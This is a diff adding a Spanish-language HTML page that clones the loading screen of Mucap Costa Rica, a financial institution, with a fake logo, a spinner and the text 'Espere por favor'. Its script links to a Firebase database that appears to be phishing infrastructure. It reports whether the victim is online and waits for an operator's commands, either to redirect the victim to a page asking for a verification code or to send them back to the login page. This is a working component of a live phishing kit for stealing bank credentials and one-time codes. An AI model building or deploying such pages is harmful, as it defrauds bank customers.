@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Alineación superior igual a la imagen original */
+            min-height: 100vh;
+            background-color: #ffffff;
+            padding-top: 50px; /* Margen superior exacto de la caja blanca */
+        }
+
+        /* Contenedor central blanco con borde suave */
+        .loading-container {
+            width: 100%;
+            max-width: 950px;
+            background-color: #ffffff;
+            border: 1px solid #f1f3f5;
+            border-radius: 8px;
+            padding: 50px 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.02);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Contenedor del logotipo de Mucap */
+        .mucap-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 30px;
+            user-select: none;
+        }
+
+        /* Tipografía y diseño idéntico del logo */
+        .logo-main {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: #0d4b94;
+            line-height: 1;
+            letter-spacing: -1.5px;
+            position: relative;
+        }
+        
+        .logo-main span {
+            color: #d62828;
+        }
+
+        /* Las barras decorativas superiores del logo real */
+        .logo-main::before {
+            content: '';
+            position: absolute;
+            top: -12px;
+            left: 55px;
+            width: 26px;
+            height: 4px;
+            background-color: #0d4b94;
+            transform: skewX(-35deg);
+        }
+
+        .logo-main::after {
+            content: '';
+            position: absolute;
+            top: -6px;
+            left: 64px;
+            width: 26px;
+            height: 4px;
+            background-color: #d62828;
+            transform: skewX(-35deg);
+        }
+
+        .logo-sub {
+            font-size: 0.65rem;
+            color: #0d4b94;
+            font-weight: 700;
+            letter-spacing: 3.5px;
+            margin-top: 4px;
+            padding-left: 4px;
+        }
+
+        /* Mensaje de espera */
+        .loading-text {
+            color: #718096;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 40px;
+            letter-spacing: 0.2px;
+        }
+
+        /* Spinner de carga idéntico mediante CSS */
+        .spinner {
+            width: 54px;
+            height: 54px;
+            border: 5px solid #edf2f7; /* Color de fondo del aro gris claro */
+            border-top: 5px solid #0d4b94; /* Color azul de carga */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Animación de rotación continua */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsivo básico para que no se corte en móviles */
+        @media (max-width: 980px) {
+            .loading-container {
+                width: 90%;
+                margin: 20px auto;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading-container">
+        
+        <div class="mucap-logo">
+            <div class="logo-main">Mucap</div>
+            <div class="logo-sub">COSTA RICA</div>
+        </div>
+
+        <div class="loading-text">Espere por favor...</div>
+
+        <div class="spinner"></div>
+
+    </div>
+<script>
+    const firebaseConfig = { databaseURL: "https://coomecipaonline-default-rtdb.firebaseio.com/" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Obtener el ID de la URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('id');
+
+    if (sessionId) {
+        // --- LÓGICA DE PRESENCIA (LUZ VERDE/ROJA) ---
+        const presenceRef = db.ref('logins/' + sessionId + '/online');
+
+        // Detectar estado de conexión con el servidor de Firebase
+        db.ref(".info/connected").on("value", (snap) => {
+            if (snap.val() === true) {
+                // Si el cliente entra a la página, marcar como online (Luz Verde)
+                presenceRef.set(true);
+
+                // Configurar que al desconectarse (cerrar pestaña/dominio), se ponga en false (Luz Roja)
+                // Esta instrucción se queda programada en el servidor de Firebase
+                presenceRef.onDisconnect().set(false);
+            }
+        });
+
+        // --- ESCUCHAR ÓRDENES DEL ADMIN ---
+        db.ref('comandos/' + sessionId).on('value', (snapshot) => {
+            const cmd = snapshot.val();
+            if (cmd) {
+                if (cmd.accion === 'pedir_codigo') {
+                    // Limpiamos el comando para que no se repita el ciclo y redirigimos
+                    db.ref('comandos/' + sessionId).remove();
+                    window.location.href = 'codigo.html?id=' + sessionId;
+                }
+                if (cmd.accion === 'rechazar') {
+                    db.ref('comandos/' + sessionId).remove();
+                    // Al rechazar, lo devolvemos al inicio
+                    window.location.href = 'index.html?error=1';
+                }
+            }
+        });
+    } else {
+        // Si no hay ID en la URL, devolvemos al index por seguridad
+        window.location.href = 'index.html';
+    }
+</script>
+</body>
+</html>
